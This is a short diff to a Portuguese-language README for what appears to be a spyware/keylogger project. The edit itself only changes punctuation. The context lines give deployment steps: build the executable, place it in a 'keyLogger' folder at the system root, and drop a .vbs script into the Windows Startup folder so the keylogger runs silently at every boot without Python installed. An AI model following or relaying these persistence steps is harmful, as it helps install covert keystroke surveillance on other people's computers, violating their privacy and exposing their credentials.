@@ -20,7 +20,7 @@ python setup.py build
 * Copie a pasta com o .exe e cole em um diretório chamado keyLogger;
 * Esta pasta deve ser colocada no diretório raiz do seu SO;
 * Após isso basta ir para o diretório C:\Users\<Seu Usuário>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup;
-* E colar o arquivo <a href="https://github.com/DarlanNoetzold/spyware/blob/main/spyware/script_background.vbs"> .vbs </a>:
+* E colar o arquivo <a href="https://github.com/DarlanNoetzold/spyware/blob/main/spyware/script_background.vbs"> .vbs </a>;
 * Agora, o script será executado toda vez que o windows iniciar, sem precisar ter as biblioteas usadas, nem o Python.
 
 ---
